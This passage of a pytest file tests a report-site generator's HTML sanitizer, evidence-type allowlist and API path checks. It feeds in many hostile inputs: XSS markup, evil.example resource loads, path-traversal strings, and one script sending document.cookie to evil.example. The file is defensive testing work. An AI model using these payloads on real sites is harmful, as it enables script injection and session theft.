    "<object data='https://evil.example/x.swf'></object>",
    "<embed src='https://evil.example/x.swf'>",
    "<base href='https://evil.example/'>",
    "<meta http-equiv='refresh' content='0;url=https://evil.example/'>",
    "<meta charset='utf-7'>",
    "<link rel='stylesheet' href='https://evil.example/x.css'>",
    "<form action='https://evil.example/'><input name='q'></form>",
    "<button formaction='javascript:alert(1)'>x</button>",
    "<input type='image' src='https://evil.example/x.png'>",
    "<video src='evidence/x.mp4' poster='javascript:alert(1)'></video>",
    "<video><source src='https://evil.example/x.mp4'></video>",
    "<noscript><p title='</noscript><img src=x onerror=alert(1)>'></p></noscript>",
    "<textarea><img src=x onerror=alert(1)></textarea>",
    "<template><img src=x onerror=alert(1)></template>",
    "<title><img src=x onerror=alert(1)></title>",
    "<!--><img src=x onerror=alert(1)>-->",
    "<!-- note -->",
    "<![CDATA[<img src=x onerror=alert(1)>]]>",
    "<?xml-stylesheet href='https://evil.example/x.xsl'?>",
    "<!DOCTYPE html SYSTEM 'https://evil.example/x.dtd'>",
    "<p>1 < 2</p>",
    "<p>x</p><img src=x onerror=alert(1)",
    "<p>a\x00b</p>",
    # va#20 round 2. Old html.parser reads <title> as ordinary markup and misses these
    # script ends, so the browser-rule scan must refuse them on every Python (B1).
    '<title><p title="</title><img src=x onerror=alert(1)>"></p></title>',
    "<script data-eval-tabs>x</script x><img src=x onerror=alert(1)></script>",
    "<script data-eval-tabs>x</script/><img src=x onerror=alert(1)></script>",
    "<script data-eval-tabs>x</script ><img src=x onerror=alert(1)></script>",
    "<script data-eval-tabs>x</script >",
    # Reached by input, each refused by one guard (B3).
    "<script data-eval-tabs>x",
    "<style>p{color:red}",
    "<svg><img src='evidence/a.png'/></svg>",
    "<p>x</p></marquee>",
    "<div style='background:url(\"data:font/woff2;base64,url(https://evil.example/x)\")'>x</div>",
]

# Cases the html.parser layer is not there for: the control-character check comes first, and
# html.parser alone accepts the rest on some Python releases, which is what the scan is for.
NOT_PARSER_MARKUP = {
    "<p>a\x00b</p>",
    '<title><p title="</title><img src=x onerror=alert(1)>"></p></title>',
    "<script data-eval-tabs>x</script x><img src=x onerror=alert(1)></script>",
    "<script data-eval-tabs>x</script/><img src=x onerror=alert(1)></script>",
}


def _page(markup: str) -> str:
    return f"<!doctype html><html lang='en'><body><main>{markup}</main></body></html>\n"


@pytest.mark.parametrize("markup", HOSTILE_REPORT_MARKUP)
def test_report_html_policy_refuses_hostile_markup(markup: str):
    import reports_render

    # Each case gets past at least one rule; dropping that rule from the policy fails it.
    with pytest.raises(site_tool.SiteError):
        reports_render.checked_report_html(_page(markup), "probe")


@pytest.mark.parametrize("markup", [m for m in HOSTILE_REPORT_MARKUP if m not in NOT_PARSER_MARKUP])
def test_parser_allowlist_alone_refuses_hostile_markup(markup: str):
    import reports_render

    # The html.parser layer is tested without the scan in front of it, so each of its
    # rules stays tested even where the scan refuses the same input first.
    with pytest.raises(site_tool.SiteError):
        reports_render._parsed_policy(_page(markup))


# The browser-rule scan (B1). Each case is refused by the scan on its own, on every Python.
SCAN_REFUSED_MARKUP = [
    # Vera's B1 page: a browser closes <title> early and runs the onerror.
    '<title><p title="</title><img src=x onerror=alert(1)>"></p></title>',
    "<title>a<b</title>",
    "<textarea><b>x</b></textarea>",
    "<title>x</TITLE>",
    "<title>x",
    "<title/>x</title>",
    "<script data-eval-tabs>x</script x>",
    "<script data-eval-tabs>x</script/>",
    "<script data-eval-tabs>x</script >",
    "<script data-eval-tabs>x</SCRIPT>",
    "<script data-eval-tabs>x",
    "<script data-eval-tabs/>x</script>",
    "<script data-eval-tabs><!--<script>x</script>y</script>",
    "<script data-eval-tabs>a</p>b</script>",
    "<style>p{}</style >",
    "<style>a</p>b</style>",
    "<style><!--p{}--></style>",
    # Attribute values may not hold markup, and an unquoted one may not end in "/".
    '<p title="a<b">x</p>',
    '<p title="a>b">x</p>',
    "<p title='a<b'>x</p>",
    "<img src=evidence/a.png/>",
    # Only a browser's whitespace separates attributes.
    "<p\u00a0title=x>x</p>",
    "<p title=x\u00a0class=y>x</p>",
    "<p title='x'class='y'>x</p>",
    # Every "<" begins a plain tag or the doctype.
    "< p>x</p>",
    "<p>1 < 2</p>",
    "<p>x</p ></p>",
    "<a/href='https://ok.example/'>x</a>",
    "<!-- note -->",
    "<!DOCTYPE html SYSTEM 'https://evil.example/x.dtd'>",
    "<?xml-stylesheet href='https://evil.example/x.xsl'?>",
    "<![CDATA[x]]>",
    "<p>x</p><img src=x onerror=alert(1)",
]


@pytest.mark.parametrize("markup", SCAN_REFUSED_MARKUP)
def test_browser_rule_scan_refuses_ambiguous_markup(markup: str):
    import reports_render

    with pytest.raises(site_tool.SiteError):
        reports_render._scan_markup(_page(markup))
    with pytest.raises(site_tool.SiteError):
        reports_render.checked_report_html(_page(markup), "probe")


@pytest.mark.parametrize(
    "markup",
    [
        '<p title="a&gt;b" class=x>x</p>',
        "<img src=evidence/a.png alt=x>",
        "<p\ttitle=x\nclass='y'\f\rid=\"z\">x</p>",
        "<svg viewBox='0 0 1 1'><title>t</title><path d='M0 0'/></svg>",
        "<style>/* #evaluator-<id> */p{}</style>",
        "<script data-eval-tabs>if(a<b){}</script>",
        "<br/><hr />",
    ],
)
def test_browser_rule_scan_accepts_plain_markup(markup: str):
    import reports_render

    reports_render._scan_markup(_page(markup))


@pytest.mark.parametrize("tail", ["<script data-eval-tabs>x", "<title>x", "<style>p{}"])
def test_browser_rule_scan_refuses_a_raw_text_element_that_never_closes(tail: str):
    import reports_render

    # Nothing after it, not even another end tag.
    with pytest.raises(site_tool.SiteError, match="does not end"):
        reports_render._scan_markup("<!doctype html><p>x</p>" + tail)


def test_browser_rule_scan_accepts_the_real_reporter_page():
    import reports_render

    reports_render._scan_markup(REPORTER_FIXTURE.read_text(encoding="utf-8"))


def test_real_reporter_report_passes_the_policy_byte_for_byte():
    import reports_render

    text = REPORTER_FIXTURE.read_text(encoding="utf-8")
    # A real v3.15.4 page: inline fonts, both reporter scripts, SVG, video and links.
    for marker in ("<script data-eval-tabs>", "<script data-report-times>", "<svg", "<video"):
        assert marker in text
    assert reports_render.checked_report_html(text, "fixture") == text


def test_unknown_reporter_script_is_removed_with_a_warning(capsys):
    import reports_render

    page = (
        "<!doctype html><html lang='en'><body><p>kept</p>"
        "<script data-report-times>fetch('https://evil.example/'+document.cookie)</script>"
        "<p>also kept</p></body></html>\n"
    )
    cleaned = reports_render.checked_report_html(page, "probe")
    assert cleaned == (
        "<!doctype html><html lang='en'><body><p>kept</p><p>also kept</p></body></html>\n"
    )
    assert "not a known reporter script" in capsys.readouterr().err


def _forged_run(runs_in: Path, html_text: str, **kwargs) -> Path:
    folder = _make_run_folder(runs_in, "hallway", run_id="909", html_override=html_text, **kwargs)
    # A forged run folder recomputes SHA256SUMS, so the checksums still match.
    (folder / "SHA256SUMS").write_text(
        "".join(
            f"{hashlib.sha256((folder / n).read_bytes()).hexdigest()}  {n}\n"
            for n in site_tool.REPORT_FILES
        ),
        encoding="utf-8",
    )
    return folder


def test_forged_run_folder_with_recomputed_sha256sums_and_hostile_report_is_refused(
    tmp_path: Path,
):
    hostile = "<!doctype html><html><body><main><svg onload=alert(1)></svg></main></body></html>\n"
    _forged_run(tmp_path / "in", hostile)
    reports_dir = tmp_path / "reports"
    with pytest.raises(site_tool.SiteError, match="onload"):
        site_tool.build(reports_dir, tmp_path / "in")
    assert not list(reports_dir.rglob("runs/909/index.html"))


def test_report_html_file_is_checked_where_it_is_written(tmp_path: Path):
    folder = tmp_path / "run"
    folder.mkdir()
    hostile = "<!doctype html><html><body><img src=x onerror=alert(1)></body></html>\n"
    with pytest.raises(site_tool.SiteError, match="onerror"):
        site_tool.publish_report_files(folder, hostile)
    assert not (folder / "report.html").exists()


def test_deleting_the_artifact_word_cannot_assemble_a_fetch(tmp_path: Path):
    # The site deletes the word "artifact" after reading the page; the policy runs on the
    # page it publishes, so "uartifactrl(" turning into "url(" is still refused.
    hostile = (
        "<!doctype html><html><head><style>body{background:uartifactrl(https://evil.example/x)}"
        "</style></head><body><main><p>x</p></main></body></html>\n"
    )
    _forged_run(tmp_path / "in", hostile)
    with pytest.raises(site_tool.SiteError, match="style"):
        site_tool.build(tmp_path / "reports", tmp_path / "in")


def test_real_reporter_report_is_published_unchanged(tmp_path: Path):
    text = REPORTER_FIXTURE.read_text(encoding="utf-8")
    _make_run_folder(tmp_path / "in", "hallway", run_id="910", html_override=text)
    site_tool.build(tmp_path / "reports", tmp_path / "in")
    run_dir = tmp_path / "reports/unitree-g1/stock-mujoco-hallway/runs/910"
    assert (run_dir / "report.html").read_text(encoding="utf-8") == text
    page = (run_dir / "index.html").read_text(encoding="utf-8")
    for marker in ("<script data-eval-tabs>", "<script data-report-times>", "<video"):
        assert marker in page


# Evidence a browser could run as a document on the Pages origin. GitHub Pages serves .xsd
# and .rng as application/xml, and Chrome runs the XHTML script inside (B2).
DROPPED_EVIDENCE = {
    "plot.svg": b"<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>",
    "page.htm": b"<script>alert(1)</script>",
    "doc.xhtml": b"<html xmlns='http://www.w3.org/1999/xhtml'><script>alert(1)</script></html>",
    "sub/page.html": b"<script>alert(1)</script>",
    "schema.xsd": b"<r xmlns:h='http://www.w3.org/1999/xhtml'><h:script>alert(1)</h:script></r>",
    "grammar.rng": b"<r xmlns:h='http://www.w3.org/1999/xhtml'><h:script>alert(1)</h:script></r>",
    "data.unknownext": b"<script>alert(1)</script>",
    "noext": b"<script>alert(1)</script>",
}
# What reporters emit, and the plain formats a browser only displays.
KEPT_EVIDENCE = {
    name: b"x"
    for name in (
        "trial.mcap seed-01.mp4 clip.webm clip.mov clip.mkv clip.avi frame.png frame.jpg "
        "frame.jpeg frame.gif frame.webp sub/media.json run.txt run.log notes.md table.csv"
    ).split()
}


@pytest.mark.parametrize("stored", [False, True])
def test_only_allowlisted_evidence_types_are_published(tmp_path: Path, stored: bool):
    files = {**KEPT_EVIDENCE, **DROPPED_EVIDENCE}
    folder = _make_run_folder(tmp_path / "in", "hallway", run_id="911", evidence_files=files)
    if stored:
        # run.json can name evidence files directly, which skipped the old .html filter.
        record = json.loads((folder / "run.json").read_text(encoding="utf-8"))
        record["evidence"] = [
            {"label": name, "kind": "note", "files": [{"path": f"evidence/{name}"}]}
            for name in files
        ]
        (folder / "run.json").write_text(json.dumps(record), encoding="utf-8")
    site_tool.build(tmp_path / "reports", tmp_path / "in")
    evidence = tmp_path / "reports/unitree-g1/stock-mujoco-hallway/runs/911/evidence"
    published = {p.relative_to(evidence).as_posix() for p in evidence.rglob("*") if p.is_file()}
    assert set(KEPT_EVIDENCE) <= published
    assert not published & set(DROPPED_EVIDENCE)


# ---------------------------------------------------------------- va#20 N1: restored runs


def _restored_run(tmp_path: Path) -> tuple[Path, Path]:
    _make_run_folder(tmp_path / "in1", "hallway", run_id="920", created="2026-11-20T06:00:00Z")
    reports = tmp_path / "reports"
    site_tool.build(reports, tmp_path / "in1")
    return reports, reports / "unitree-g1/stock-mujoco-hallway/runs/920"


def _build_next_run(tmp_path: Path, reports: Path) -> None:
    _make_run_folder(tmp_path / "in2", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    site_tool.build(reports, tmp_path / "in2")


def test_a_clean_restored_run_is_rechecked_and_kept(tmp_path: Path):
    reports, run = _restored_run(tmp_path)
    # A genuine listing page, written by the site's own write_listing, next to the
    # evidence it lists.
    import reports_render

    (run / "evidence/clip").mkdir(parents=True, exist_ok=True)
    files = []
    for name in ("trial-01.mp4", "trial-02.mp4"):
        (run / "evidence/clip" / name).write_bytes(b"mp4")
        files.append({"path": f"evidence/clip/{name}", "bytes": 3, "sha256": "0" * 64})
    reports_render.write_listing(
        run, {"label": "clip", "name": "clip", "preserved": True, "files": files}, "../../../../"
    )
    assert (run / "evidence/clip.html").is_file()
    before = {p: p.read_bytes() for p in run.rglob("*") if p.is_file()}
    _build_next_run(tmp_path, reports)
    assert {p: p.read_bytes() for p in run.rglob("*") if p.is_file()} == before
    assert (reports / "unitree-g1/stock-mujoco-hallway/runs/921/index.html").is_file()


@pytest.mark.parametrize("page", ["report.html", "index.html"])
@pytest.mark.parametrize(
    "injected",
    [
        "<img src=x onerror=alert(1)>",
        # An unknown script would be removed from a new page; a restored one fails the build.
        "<script data-report-times>alert(1)</script>",
    ],
)
def test_a_hostile_restored_page_fails_the_next_build(tmp_path: Path, page: str, injected: str):
    reports, run = _restored_run(tmp_path)
    path = run / page
    text = path.read_text(encoding="utf-8")
    path.write_text(text.replace("</body>", injected + "</body>", 1), encoding="utf-8")
    with pytest.raises(site_tool.SiteError, match="restored"):
        _build_next_run(tmp_path, reports)


@pytest.mark.parametrize(
    "planted",
    [
        "<!doctype html><html><body><script>alert(document.domain)</script></body></html>\n",
        "<!doctype html><html><body><img src=x onerror=alert(1)></body></html>\n",
        # An unknown script would be cut from a new page; a restored one fails the build.
        "<!doctype html><html><body><script data-report-times>alert(1)</script></body></html>\n",
    ],
)
def test_a_planted_restored_evidence_page_fails_the_next_build(tmp_path: Path, planted: str):
    # Vera's round 3 probe (B5): a top-level evidence/*.html in a restored run is a page on
    # the Pages origin, so it gets the policy check like report.html, not a pass as a listing.
    reports, run = _restored_run(tmp_path)
    (run / "evidence").mkdir(exist_ok=True)
    (run / "evidence/evil.html").write_text(planted, encoding="utf-8")
    with pytest.raises(site_tool.SiteError, match="restored .*evil.html"):
        _build_next_run(tmp_path, reports)


@pytest.mark.parametrize("name", ["schema.xsd", "sub/page.html", "plot.svg", "noext", "x.HTML"])
def test_restored_evidence_of_an_unpublished_type_fails_the_next_build(tmp_path: Path, name: str):
    reports, run = _restored_run(tmp_path)
    path = run / "evidence" / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(b"<r xmlns:h='http://www.w3.org/1999/xhtml'><h:script>1</h:script></r>")
    with pytest.raises(site_tool.SiteError, match="restored"):
        _build_next_run(tmp_path, reports)


# ---------------------------------------------------------------- va#24: API path traversal


@pytest.mark.parametrize(
    "value",
    [
        "..",
        "Owner/..",
        "../user",
        ".",
        "Owner/.",
        "",
        "Owner//Name",
        "Owner/",
        "/Owner/Name",
        "Owner\\Name",
        "Owner/%2e%2e",
        "%2E%2E%2Fuser",
        "Owner/Na\x00me",
        "Owner/Na\nme",
        "Owner/Na\x7fme",
        "Owner/Name?x=1",
        "Owner/Name#x",
        None,
        True,
        -1,
    ],
)
def test_api_path_segments_refuse_unsafe_forms(value: object):
    with pytest.raises(site_tool.SiteError, match="not a safe API path"):
        reports_restore._api_path_segments(value, "probe")


def test_api_url_encodes_each_segment_and_the_query():
    url = reports_restore._api_url(
        "https://api.github.com", "repos", "O/N", "actions/runs", 42, query={"name": "a&b=c"}
    )
    assert url == "https://api.github.com/repos/O/N/actions/runs/42?name=a%26b%3Dc"
    spaced = reports_restore._api_url("https://api.github.com", "repos", "O/a b&c=d@e")
    assert spaced == "https://api.github.com/repos/O/a%20b%26c%3Dd%40e"
    assert reports_restore._repository_parts("Living-Proof-Labs/livingproof-unitree-g1") == [
        "Living-Proof-Labs",
        "livingproof-unitree-g1",
    ]
    with pytest.raises(site_tool.SiteError, match="OWNER/NAME"):
        reports_restore._repository_parts("a/b/c")


@pytest.mark.parametrize("repository", ["Owner/..", "../../user", "Owner/Name/../../x", "O/N?x"])
def test_restore_with_a_traversal_repository_makes_no_request(
    tmp_path: Path, monkeypatch, repository: str
):
    calls: list[str] = []

    def record(url, token):
        calls.append(url)
        raise AssertionError(f"unexpected request {url}")

    monkeypatch.setattr(reports_restore, "_request", record)
    monkeypatch.setattr(reports_restore, "_open_once", record)
    with pytest.raises(site_tool.SiteError, match="not a safe API path|OWNER/NAME"):
        reports_restore.restore(tmp_path / "out", repository, token="ghs_testtoken")
    assert calls == []


def test_workflow_run_id_from_the_api_cannot_change_the_path(monkeypatch):
    calls: list[str] = []
    monkeypatch.setattr(reports_restore, "_request", lambda url, token: calls.append(url))
    with pytest.raises(site_tool.SiteError, match="not a safe API path"):
        reports_restore._workflow_run(
            "O/N", "1/../../../user", "ghs_testtoken", "https://api.github.com"
        )
    assert calls == []


def test_a_restored_html_page_below_the_top_of_evidence_is_never_a_listing(tmp_path: Path):
    # Listings live only at evidence/<name>.html, so a nested page fails on its type even
    # when its markup would pass the page policy.
    reports, run = _restored_run(tmp_path)
    (run / "evidence/sub").mkdir(parents=True, exist_ok=True)
    (run / "evidence/sub/page.html").write_text("<!doctype html><p>x</p>\n", encoding="utf-8")
    with pytest.raises(site_tool.SiteError, match="evidence of this type is not published"):
        _build_next_run(tmp_path, reports)


# ---------------------------------------------------------------- va#32: nesting depth and size


class _CountingStack(list):
    """An open-element stack that counts every element a whole-stack scan could visit."""

    scanned = 0

    def _scan(self) -> None:
        _CountingStack.scanned += len(self)

    def __contains__(self, item):
        self._scan()
        return super().__contains__(item)

    def __iter__(self):
        self._scan()
        return super().__iter__()

    def __reversed__(self):
        self._scan()
        return super().__reversed__()

    def index(self, *args):
        self._scan()
        return super().index(*args)

    def count(self, item):
        self._scan()
        return super().count(item)

    def remove(self, item):
        self._scan()
        return super().remove(item)


def _count_stack_scans(monkeypatch, text: str) -> int:
    import reports_render

    original = reports_render._ReportHtmlPolicy.__init__

    def counting_init(self, page: str) -> None:
        original(self, page)
        self.stack = _CountingStack()

    monkeypatch.setattr(reports_render._ReportHtmlPolicy, "__init__", counting_init)
    monkeypatch.setattr(_CountingStack, "scanned", 0)
    assert reports_render.checked_report_html(text, "probe") == text
    return _CountingStack.scanned


DEEP_NESTING = 20_000


@pytest.mark.parametrize(
    "markup",
    [
        pytest.param("<p>" * DEEP_NESTING, id="unclosed-start-tags"),
        pytest.param("<p>" * DEEP_NESTING + "</span>" * DEEP_NESTING, id="end-tags-not-open"),
        pytest.param(
            "<div>" + "<p>" * DEEP_NESTING + "</div>" * DEEP_NESTING, id="mismatched-closes"
        ),
    ],
)
def test_report_html_policy_never_rescans_the_open_element_stack(monkeypatch, markup: str):
    # Deterministic, unlike a wall-clock bound: count the stack elements visited by
    # membership tests, iteration and searches. The old `"svg" in self.stack` and
    # `tag in self.stack` visit the whole stack on every tag (about N*N/2 here).
    scanned = _count_stack_scans(monkeypatch, _page(markup))
    assert scanned <= DEEP_NESTING, f"{scanned} stack elements scanned for depth {DEEP_NESTING}"


@pytest.mark.timeout(20)
def test_report_html_policy_finishes_100k_unclosed_tags_within_the_timeout():
    import reports_render

    # The issue's probe: 100,000 unclosed <p> (22 s before the fix) and as many stray end
    # tags. The stack-scan count above is the regression check; this per-test timeout is a
    # generous backstop, about 40 times what the linear policy needs on a laptop.
    page = _page("<p>" * 100_000 + "</span>" * 100_000)
    assert reports_render.checked_report_html(page, "probe") == page


class _ReferenceHtmlPolicy:
    """The policy's stack handling as it was before va#32, to compare against."""

    @staticmethod
    def build():
        import reports_render

        class Reference(reports_render._ReportHtmlPolicy):
            def in_svg(self) -> bool:
                return "svg" in self.stack

            def handle_endtag(self, tag: str) -> None:
                if (
                    tag not in reports_render._HTML_ELEMENTS
                    and tag not in reports_render._SVG_ELEMENTS
                ):
                    self.refuse(f"</{tag}> is not allowed")
                if tag == "script" and self.script_start is not None:
                    start = self.source_offset()
                    if self.text[start : start + 9].lower() != "</script>":
                        self.refuse("</script> is not plainly written")
                    element = self.text[self.script_start : start + 9]
                    digest = hashlib.sha256(element.encode("utf-8")).hexdigest()
                    if digest not in reports_render.KNOWN_REPORTER_SCRIPTS:
                        self.unknown_scripts.append((self.script_start, start + 9, digest))
                    self.script_start = None
                if self.in_svg():
                    if self.stack[-1] != tag:
                        self.refuse(
                            f"</{tag}> does not close the open <{self.stack[-1]}> inside <svg>"
                        )
                    self.stack.pop()
                elif tag in self.stack:
                    while self.stack.pop() != tag:
                        pass

        return Reference


def _policy_outcome(policy_class, text: str):
    policy = policy_class(text)
    try:
        policy.feed(text)
        policy.close()
    except site_tool.SiteError as exc:
        return ("refused", str(exc)), policy
    return ("accepted", list(policy.stack), policy.unknown_scripts), policy


def _assert_counters_match_stack(policy) -> None:
    stack = list.__iter__(policy.stack)
    counts = collections.Counter(stack)
    assert {tag: n for tag, n in policy.open_counts.items() if n} == dict(counts)
    assert all(n >= 0 for n in policy.open_counts.values())
    assert policy.svg_depth == counts["svg"]


# Hand-written stack edge cases: implicit and mismatched closes, void elements, foreign
# svg/math content and end tags for elements that are not open.
STACK_EDGE_MARKUP = [
    "<div><span>x</div>after</span>",
    "<p><div>x</p></div>",
    "<ul><li>a<li>b</ul><p>c",
    "<table><tr><td>a<td>b</table>",
    "<p>a<p>b</p></p></p>",
    "<br></br><hr></hr><img src=a.png></img><input></input>",
    "<br/><img src=a.png/>",
    "</span></div></svg></g></p>",
    "<svg><g><rect/></g></svg><p>x</p>",
    "<svg><g></svg>",
    "<svg><svg><g></g></svg></svg>",
    "<svg><g></g></svg></svg></g>",
    "<p><svg><text>a<tspan>b</tspan></text></svg></p>",
    "<svg><title>t</title><desc>d</desc></svg>",
    "<title>t</title><svg><title>s</title></svg>",
    "<svg></p></svg>",
    "<svg><g></p></g></svg>",
    "<math><mi>x</mi></math>",
    "<p><svg>",
    "<svg/><p>x</p>",
    "<div><svg></div></svg>",
    "<script data-eval-tabs>x</script><svg></svg>",
]

_FUZZ_TOKENS = [
    *(f"<{t}>" for t in "p div span em table tr td ul li a title svg g text tspan math".split()),
    *(f"</{t}>" for t in "p div span em table tr td ul li a title svg g text tspan math".split()),
    "<br>",
    "</br>",
    "<img src=a.png>",
    "<rect/>",
    "<g/>",
    "<svg/>",
    "<hr/>",
    "x",
    " ",
]


def _fuzz_corpus(count: int, seed: int = 32) -> list[str]:
    import random

    rng = random.Random(seed)
    return ["".join(rng.choices(_FUZZ_TOKENS, k=rng.randint(1, 40))) for _ in range(count)]


def test_linear_stack_tracking_matches_the_old_policy_on_every_case():
    import reports_render

    reference = _ReferenceHtmlPolicy.build()
    pages = [REPORTER_FIXTURE.read_text(encoding="utf-8")]
    pages += [
        _page(m)
        for m in HOSTILE_REPORT_MARKUP
        + SCAN_REFUSED_MARKUP
        + STACK_EDGE_MARKUP
        + _fuzz_corpus(3000)
    ]
    outcomes = collections.Counter()
    for page in pages:
        new, policy = _policy_outcome(reports_render._ReportHtmlPolicy, page)
        old, _ = _policy_outcome(reference, page)
        assert new == old, page
        outcomes[new[0]] += 1
        # The counters must equal the stack after every case, refused ones included.
        _assert_counters_match_stack(policy)
    # The corpus exercises both outcomes, so the comparison is not vacuous.
    assert outcomes["accepted"] > 100 and outcomes["refused"] > 100


@pytest.mark.parametrize("markup", STACK_EDGE_MARKUP)
def test_stack_counters_stay_in_step_after_every_tag(markup: str):
    import reports_render

    class Checked(reports_render._ReportHtmlPolicy):
        def handle_starttag(self, tag, attrs):
            super().handle_starttag(tag, attrs)
            _assert_counters_match_stack(self)

        def handle_endtag(self, tag):
            super().handle_endtag(tag)
            _assert_counters_match_stack(self)

    _policy_outcome(Checked, _page(markup))


def _page_of_bytes(size: int, filler: str) -> str:
    head = "<!doctype html><p>"
    tail = "</p>\n"
    room = size - len((head + tail).encode("utf-8"))
    unit = len(filler.encode("utf-8"))
    body = filler * (room // unit) + "a" * (room % unit)
    page = head + body + tail
    assert len(page.encode("utf-8")) == size
    return page


@pytest.mark.parametrize(
    "filler", ["a", "\u00e9", "\u20ac"], ids=["ascii", "two-byte", "three-byte"]
)
def test_report_html_size_limit_is_exact_in_utf8_bytes(monkeypatch, filler: str):
    import reports_render

    limit = reports_render.MAX_REPORT_HTML_BYTES
    assert limit == 8 * 1024 * 1024
    parsed = []
    monkeypatch.setattr(reports_render, "_scan_markup", lambda text: parsed.append(len(text)))
    monkeypatch.setattr(reports_render, "_parsed_policy", lambda text: _EmptyPolicy())

    at_limit = _page_of_bytes(limit, filler)
    assert reports_render.checked_report_html(at_limit, "probe") == at_limit
    assert parsed == [len(at_limit)]

    over = _page_of_bytes(limit + 1, filler)
    with pytest.raises(
        site_tool.SiteError, match=rf"^probe: report.html exceeds the {limit}-byte limit$"
    ):
        reports_render.checked_report_html(over, "probe")
    # Refused before either parsing layer runs.
    assert parsed == [len(at_limit)]


class _EmptyPolicy:
    unknown_scripts: list = []


def test_a_page_of_exactly_the_size_limit_passes_the_real_policy():
    import reports_render

    page = _page_of_bytes(reports_render.MAX_REPORT_HTML_BYTES, "a")
    assert reports_render.checked_report_html(page, "probe") == page


# ---------------------------------------------------------------- issue #31: exclude-runs


def test_exclude_runs_skips_hostile_restored_run_and_keeps_other_runs_byte_for_byte(
    tmp_path: Path, capsys
):
    _make_run_folder(tmp_path / "in1/r1", "hallway", run_id="919", created="2026-11-19T06:00:00Z")
    _make_run_folder(tmp_path / "in1/r2", "hallway", run_id="920", created="2026-11-20T06:00:00Z")
    reports = tmp_path / "reports"
    site_tool.build(reports, tmp_path / "in1")

    kept_run = reports / "unitree-g1/stock-mujoco-hallway/runs/919"
    hostile_run = reports / "unitree-g1/stock-mujoco-hallway/runs/920"
    kept_before = {p: p.read_bytes() for p in kept_run.rglob("*") if p.is_file()}

    report_html = hostile_run / "report.html"
    report_html.write_text(
        report_html.read_text(encoding="utf-8").replace(
            "</body>", "<script data-report-times>alert(1)</script></body>", 1
        ),
        encoding="utf-8",
    )

    _make_run_folder(tmp_path / "in2", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    reports_without_exclude = tmp_path / "reports-without-exclude"
    shutil.copytree(reports, reports_without_exclude)
    with pytest.raises(site_tool.SiteError, match="restored"):
        site_tool.build(reports_without_exclude, tmp_path / "in2")

    capsys.readouterr()
    site_tool.build(reports, tmp_path / "in2", exclude_runs=("920",))
    err = capsys.readouterr().err

    assert "::warning::" in err
    assert "920" in err
    assert not hostile_run.exists()
    assert {p: p.read_bytes() for p in kept_run.rglob("*") if p.is_file()} == kept_before
    assert (reports / "unitree-g1/stock-mujoco-hallway/runs/921/index.html").is_file()

    history_html = (reports / "unitree-g1/stock-mujoco-hallway/index.html").read_text(
        encoding="utf-8"
    )
    latest_html = (reports / "unitree-g1/stock-mujoco-hallway/latest/index.html").read_text(
        encoding="utf-8"
    )
    index_html = (reports / "index.html").read_text(encoding="utf-8")
    assert "runs/920/" not in history_html
    assert "runs/920/" not in latest_html
    assert "runs/920/" not in index_html
    assert "runs/921/" in latest_html
    assert site_tool.read_json_object(reports / site_tool.MARKER)["runs"] == 2


def test_exclude_runs_removes_empty_scenario_when_only_restored_run_is_excluded(
    tmp_path: Path, capsys
):
    _make_run_folder(
        tmp_path / "in1",
        "corner-left",
        variant="stock-mujoco-corner-left",
        run_id="918",
        created="2026-11-18T06:00:00Z",
    )
    reports = tmp_path / "reports"
    site_tool.build(reports, tmp_path / "in1")
    assert (reports / "unitree-g1/stock-mujoco-corner-left/runs/918").is_dir()

    _make_run_folder(tmp_path / "in2", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    site_tool.build(reports, tmp_path / "in2", exclude_runs=("918",))
    err = capsys.readouterr().err

    assert "::warning::" in err
    assert "918" in err
    assert not (reports / "unitree-g1/stock-mujoco-corner-left").exists()
    index_html = (reports / "index.html").read_text(encoding="utf-8")
    assert "stock-mujoco-corner-left" not in index_html
    assert "stock-mujoco-hallway" in index_html
    assert site_tool.read_json_object(reports / site_tool.MARKER)["runs"] == 1


def test_exclude_runs_unknown_id_only_warns(tmp_path: Path, capsys):
    reports, run = _restored_run(tmp_path)
    before = {p: p.read_bytes() for p in run.rglob("*") if p.is_file()}

    _make_run_folder(tmp_path / "in2", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    capsys.readouterr()
    site_tool.build(reports, tmp_path / "in2", exclude_runs=("999999",))
    err = capsys.readouterr().err

    assert "::warning::" in err
    assert "999999" in err
    assert {p: p.read_bytes() for p in run.rglob("*") if p.is_file()} == before
    assert (reports / "unitree-g1/stock-mujoco-hallway/runs/921/index.html").is_file()


@pytest.mark.parametrize(
    "raw_value",
    [
        "a/b",
        "920/..",
        "..",
        "../920",
        "a\\b",
        ",",
        "920,",
        ",920",
        "920,,921",
        "920, ,921",
        "920\x00",
        "920\x1b",
        "920\x7f",
        "920\r921",
        ".hidden",
        "C:\\runs\\920",
        "920:1",
        "\uff19\uff12\uff10",
        "920\u200b",
        "92\u00e90",
    ],
)
def test_exclude_runs_invalid_entry_is_refused_before_anything_is_written(
    tmp_path: Path, monkeypatch, raw_value: str
):
    _make_run_folder(tmp_path / "in1", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    reports = tmp_path / "reports"
    restore_calls: list[object] = []

    def fail_if_called(*args, **kwargs):
        restore_calls.append((args, kwargs))
        raise AssertionError("restore() must not be called when exclude-runs is invalid")

    monkeypatch.setattr(site_tool, "restore", fail_if_called)

    with pytest.raises(site_tool.SiteError):
        site_action.run_site_action(
            {
                "INPUT_RUNS_DIR": str(tmp_path / "in1"),
                "INPUT_OUTPUT_DIR": "reports",
                "INPUT_RESTORE_HISTORY": "true",
                "INPUT_EXCLUDE_RUNS": raw_value,
                "GITHUB_WORKSPACE": str(tmp_path),
                "GITHUB_EVENT_NAME": "push",
                "GITHUB_REPOSITORY": "Living-Proof-Labs/livingproof-unitree-g1",
                "GITHUB_RUN_ID": "921",
            }
        )

    assert restore_calls == []
    assert not reports.exists()


def test_exclude_runs_matching_a_new_run_fails(tmp_path: Path):
    reports, run = _restored_run(tmp_path)
    before = {p: p.read_bytes() for p in run.rglob("*") if p.is_file()}

    _make_run_folder(tmp_path / "in2", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    with pytest.raises(site_tool.SiteError, match="exclude-runs"):
        site_tool.build(reports, tmp_path / "in2", exclude_runs=("921",))

    assert {p: p.read_bytes() for p in run.rglob("*") if p.is_file()} == before
